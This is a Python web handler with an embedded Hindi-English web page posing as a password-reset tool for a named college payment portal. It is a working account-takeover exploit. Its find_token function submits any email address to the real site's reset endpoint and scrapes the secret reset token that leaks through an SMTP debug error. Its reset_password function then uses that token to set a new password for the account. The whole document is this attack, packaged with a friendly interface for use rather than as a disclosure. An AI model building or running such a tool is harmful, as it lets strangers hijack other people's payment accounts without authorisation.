from http.server import BaseHTTPRequestHandler
import json
import re
import requests
from urllib.parse import parse_qs

HTML = r"""<!DOCTYPE html>
<html lang="hi">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Password Reset • Vanraj College</title>
  <style>
    :root {
      --primary: #2563eb; --primary-hover: #1d4ed8; --bg: #f1f5f9; --card: #fff;
      --text: #0f172a; --muted: #64748b; --border: #e2e8f0; --radius: 12px;
    }
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: system-ui, -apple-system, sans-serif; background: var(--bg);
      min-height: 100vh; display: grid; place-items: center; padding: 1.25rem; color: var(--text);
    }
    .card {
      background: var(--card); width: 100%; max-width: 440px; padding: 2rem;
      border-radius: 16px; box-shadow: 0 8px 30px rgba(0,0,0,.08);
    }
    h1 { font-size: 1.35rem; font-weight: 700; margin-bottom: .25rem; }
    .sub { color: var(--muted); font-size: .875rem; margin-bottom: 1.5rem; }
    label { display: block; font-size: .8125rem; font-weight: 500; margin: 1rem 0 .4rem; }
    input {
      width: 100%; padding: .7rem .9rem; border: 1px solid var(--border);
      border-radius: var(--radius); font-size: .95rem;
    }
    input:focus {
      outline: none; border-color: var(--primary);
      box-shadow: 0 0 0 3px rgba(37,99,235,.15);
    }
    input.filled { border-color: #22c55e; background: #f0fdf4; }
    .row { display: flex; gap: .5rem; align-items: stretch; }
    .row input { flex: 1; min-width: 0; }
    button {
      padding: .7rem 1rem; background: var(--primary); color: #fff; border: none;
      border-radius: var(--radius); font-size: .875rem; font-weight: 600; cursor: pointer;
      white-space: nowrap;
    }
    button:hover { background: var(--primary-hover); }
    button:disabled { opacity: .65; cursor: not-allowed; }
    button.secondary { background: #475569; }
    button.secondary:hover { background: #334155; }
    button.full { width: 100%; margin-top: 1.5rem; padding: .85rem; font-size: 1rem; }
    #result {
      display: none; margin-top: 1.25rem; padding: .85rem 1rem;
      border-radius: var(--radius); font-size: .875rem; line-height: 1.5; word-break: break-all;
    }
    .ok  { background: #dcfce7; color: #166534; border: 1px solid #bbf7d0; }
    .err { background: #fee2e2; color: #991b1b; border: 1px solid #fecaca; }
    .note {
      margin-top: 1.25rem; padding: .85rem; background: #f8fafc;
      border-radius: 10px; font-size: .78rem; color: var(--muted); line-height: 1.5;
    }
  </style>
</head>
<body>
  <div class="card">
    <h1>Password Reset</h1>
    <p class="sub">Vanraj College Payment Portal</p>

    <label for="email">Email Address</label>
    <input id="email" type="email" placeholder="registered@email.com" autocomplete="email">

    <label for="token">Reset Token</label>
    <div class="row">
      <input id="token" type="text" placeholder="Find Token se auto-fill">
      <button type="button" class="secondary" id="findBtn">Find Token</button>
    </div>

    <label for="password">New Password</label>
    <input id="password" type="password" placeholder="Naya password (min 6)" autocomplete="new-password">

    <button class="full" id="btn">Reset Password</button>

    <div id="result"></div>

    <div class="note">
      <b>Steps:</b> 1) Email dalo 2) Find Token (10-20 sec lag sakta hai) 3) Password dalo 4) Reset<br>
      Hard refresh: Ctrl+Shift+R agar purana page dikhe.
    </div>
  </div>
  <script>
    const $ = id => document.getElementById(id);
    const result = $('result');

    function show(msg, ok) {
      result.style.display = 'block';
      result.className = ok ? 'ok' : 'err';
      result.textContent = msg;
    }

    async function findToken() {
      const email = $('email').value.trim();
      const btn = $('findBtn');
      const tokenInput = $('token');

      if (!email) {
        show('Pehle email address dalo', false);
        return;
      }

      btn.disabled = true;
      btn.textContent = 'Finding...';
      result.style.display = 'none';
      tokenInput.classList.remove('filled');

      try {
        const controller = new AbortController();
        const timer = setTimeout(() => controller.abort(), 35000);

        const res = await fetch('/', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ action: 'find_token', email: email }),
          signal: controller.signal
        });
        clearTimeout(timer);

        const data = await res.json();
        console.log('find_token response', data);

        if (data && data.success && data.token) {
          tokenInput.value = data.token;
          tokenInput.classList.add('filled');
          tokenInput.focus();
          show('Token mil gaya aur fill ho gaya! Ab naya password dalo aur Reset dabao.', true);
        } else {
          show((data && data.message) ? data.message : 'Token nahi mila', false);
        }
      } catch (err) {
        if (err.name === 'AbortError') {
          show('Timeout: server slow hai. Dobara Find Token try karo.', false);
        } else {
          show('Error: ' + err.message, false);
        }
      }

      btn.disabled = false;
      btn.textContent = 'Find Token';
    }

    async function resetPassword() {
      const email = $('email').value.trim();
      const token = $('token').value.trim();
      const password = $('password').value.trim();
      const btn = $('btn');

      if (!email || !token || !password) {
        show('Email, Token aur Password sab required hain', false);
        return;
      }
      if (password.length < 6) {
        show('Password kam se kam 6 characters ka hona chahiye', false);
        return;
      }

      btn.disabled = true;
      btn.textContent = 'Processing...';
      result.style.display = 'none';

      try {
        const res = await fetch('/', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ action: 'reset', email: email, token: token, password: password })
        });
        const data = await res.json();
        show(data.message || (data.success ? 'Success' : 'Failed'), !!data.success);
      } catch (err) {
        show('Error: ' + err.message, false);
      }

      btn.disabled = false;
      btn.textContent = 'Reset Password';
    }

    $('findBtn').addEventListener('click', findToken);
    $('btn').addEventListener('click', resetPassword);
    document.addEventListener('keydown', function(e) {
      if (e.key === 'Enter') resetPassword();
    });
  </script>
</body>
</html>
"""


def find_token(email: str):
    BASE_URL = "https://payment.vaccdharampur.org"
    session = requests.Session()
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    })

    r = session.get(f"{BASE_URL}/password/reset", timeout=20)
    if r.status_code != 200:
        return {"success": False, "message": f"Reset page open nahi hua ({r.status_code})"}

    m = re.search(r'name="_token"\s+value="([^"]+)"', r.text)
    if not m:
        return {"success": False, "message": "CSRF token nahi mila"}
    csrf = m.group(1)

    post = session.post(
        f"{BASE_URL}/password/email",
        data={"_token": csrf, "email": email},
        headers={"Referer": f"{BASE_URL}/password/reset", "Origin": BASE_URL},
        timeout=25,
    )

    tokens = re.findall(r"password/reset/([a-f0-9]{60,})", post.text, re.I)
    if tokens:
        token = tokens[0]
        return {
            "success": True,
            "token": token,
            "message": "Token mil gaya",
            "reset_url": f"{BASE_URL}/password/reset/{token}",
        }

    text_lower = post.text.lower()
    if "no valid recipients" in text_lower or "swift_transport" in text_lower:
        return {
            "success": False,
            "message": "SMTP error aaya lekin token extract nahi hua. Dobara try karo.",
        }

    return {
        "success": False,
        "message": f"Token nahi mila (HTTP {post.status_code}). Debug leak band ho sakta hai.",
    }


def reset_password(email: str, token: str, password: str):
    BASE_URL = "https://payment.vaccdharampur.org"
    session = requests.Session()
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    })

    reset_url = f"{BASE_URL}/password/reset/{token}"
    resp = session.get(reset_url, timeout=15)

    if resp.status_code != 200:
        raise Exception(f"Reset page open nahi hua ({resp.status_code}). Token expire/invalid.")

    csrf_token = None
    if 'name="_token"' in resp.text:
        start = resp.text.find('name="_token" value="') + len('name="_token" value="')
        end = resp.text.find('"', start)
        csrf_token = resp.text[start:end]

    if not csrf_token:
        raise Exception("CSRF token nahi mila.")

    payload = {
        "_token": csrf_token,
        "token": token,
        "email": email,
        "password": password,
        "password_confirmation": password,
    }

    post_resp = session.post(
        f"{BASE_URL}/password/reset",
        data=payload,
        headers={"Referer": reset_url, "Origin": BASE_URL},
        allow_redirects=True,
        timeout=15,
    )

    text_lower = post_resp.text.lower()
    final_url = post_resp.url.lower().rstrip("/")

    success = (
        "password has been reset" in text_lower
        or final_url.endswith("/home")
        or "/home" in final_url
        or final_url.endswith("/login")
        or "/login" in final_url
        or final_url.endswith("/dashboard")
    )

    if "/password/reset" in final_url and (
        "invalid" in text_lower or "expired" in text_lower or "can't find" in text_lower
    ):
        success = False

    if success:
        message = "Password reset successful! Ab naye password se login karo."
    elif "can't find a user" in text_lower:
        message = "Is email se koi account nahi mila."
    elif "token" in text_lower and ("invalid" in text_lower or "expired" in text_lower):
        message = "Token invalid/expire. Find Token se naya lo."
    else:
        message = f"Reset fail. URL: {post_resp.url}"

    return {
        "success": success,
        "message": message,
        "status_code": post_resp.status_code,
        "final_url": post_resp.url,
    }


class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html; charset=utf-8")
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(HTML.encode("utf-8"))

    def do_POST(self):
        content_length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(content_length).decode("utf-8")

        try:
            data = json.loads(body)
        except Exception:
            data = parse_qs(body)
            data = {k: v[0] for k, v in data.items()}

        action = (data.get("action") or "reset").strip()
        email = (data.get("email") or "").strip()

        try:
            if action == "find_token":
                if not email:
                    return self._json(400, {"success": False, "message": "Email required"})
                return self._json(200, find_token(email))

            token = (data.get("token") or "").strip()
            password = (data.get("password") or "").strip()

            if not email or not token or not password:
                return self._json(400, {
                    "success": False,
                    "message": "Email, Token aur Password sab required hain",
                })

            return self._json(200, reset_password(email, token, password))

        except Exception as e:
            return self._json(500, {"success": False, "message": f"Error: {str(e)}"})

    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.end_headers()

    def _json(self, status, data):
        self.send_response(status)
        self.send_header("Content-type", "application/json")
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(json.dumps(data).encode())
